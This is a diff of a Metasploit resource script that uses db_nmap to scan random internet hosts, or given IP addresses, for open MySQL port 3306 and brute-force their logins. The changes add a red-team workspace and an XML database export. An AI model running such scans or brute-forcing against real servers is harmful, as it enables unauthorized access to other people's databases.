@@ -1,7 +1,7 @@
    <ruby>
       help = %Q|
         Description:
-          setg CLEAN false - Do not clean database at script exit.
+          setg SAVE_DB true - Save workspace redteam to database.xml
           setg LIMMIT 1000 - Limit the number of random rhosts to search
           setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with port 3306 open
           setg RHOSTS 212.8.247.171 213.171.197.190 - To instruct db_nmap to check targets for port 3306 open
@@ -11,6 +11,7 @@
           if none value (setg) has povided then this resource script will use is own default values.
 
         Execute in msfconsole:
+          setg SAVE_DB <true-or-blank>
           setg LIMMIT <number-of-rhosts>
           setg RANDOM_HOSTS <true-or-blank>
           setg RHOSTS <hosts-separated-by-spaces>
@@ -22,9 +23,12 @@
       |
       print_line(help)
       Rex::sleep(2.0)
+      print_line("")
 
+
+      run_single("workspace -a redteam")
       if (framework.datastore['RANDOM_HOSTS'] == 'true')
-         if (framework.datastore['RANDOM'] == nil or framework.datastore['RANDOM'] == '')
+         if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
            run_single("setg LIMMIT 800")
            print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['LIMMIT']} -p 3306 --open --script=mysql-info.nse")
          else
@@ -60,18 +64,18 @@
               print_error("Please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               print_line("")
-              run_single("unsetg RHOSTS USERPASS_FILE LIMMIT RANDOM_HOSTS")
+              run_single("unsetg SAVE_DB RHOSTS USERPASS_FILE LIMMIT RANDOM_HOSTS")
               File.delete('/root/mysql_brute.log')
+              run_single("workspace -d redteam")
               return nil
          elsif xport.nil? or xport == ''
               print_error("db_nmap did not find any 3306 open ports.")
               print_error("Please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               print_line("")
-              run_single("unsetg RHOSTS USERPASS_FILE LIMMIT RANDOM_HOSTS")
-              run_single("services -d")
-              run_single("hosts -d")
+              run_single("unsetg SAVE_DB RHOSTS USERPASS_FILE LIMMIT RANDOM_HOSTS")
               File.delete('/root/mysql_brute.log')
+              run_single("workspace -d redteam")
               return nil
          end
 
@@ -102,21 +106,17 @@
        end
 
 
+      if (framework.datastore['SAVE_DB'] == "true")
+         rand = Rex::Text.rand_text_alpha(5)
+         print_warning("Exporting database to: database_#{rand}.xml")
+         run_single("db_export -f xml -a /root/database_#{rand}.xml")
+      end
+
       print_warning("Please wait, Cleaning global variables.")
       Rex::sleep(1.5)
-      if (framework.datastore['CLEAN'] == "false")
-           run_single("unsetg CLEAN RHOSTS LIMMIT RANDOM_HOSTS USERPASS_FILE")
-           run_single("unset THREADS VERBOSE USERNAME USERPASS_FILE PASSWORD STOP_ON_SUCCESS")
-           print_line("")
-      else
-           run_single("unsetg CLEAN RHOSTS LIMMIT RANDOM_HOSTS USERPASS_FILE")
-           run_single("unset THREADS VERBOSE USERNAME USERPASS_FILE PASSWORD STOP_ON_SUCCESS")
-           print_warning("Please wait, Cleaning database.")
-           Rex::sleep(1.5)
-           run_single("hosts -d")
-           run_single("services -d")
-           print_line("")
-      end
+      run_single("unsetg SAVE_DB CLEAN RHOSTS LIMMIT RANDOM_HOSTS USERPASS_FILE")
+      run_single("unset THREADS VERBOSE USERNAME USERPASS_FILE PASSWORD STOP_ON_SUCCESS")
+      run_single("workspace -d redteam")
 
 print_warning("Logfile stored under: /root/mysql_brute.log")
 print_status("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
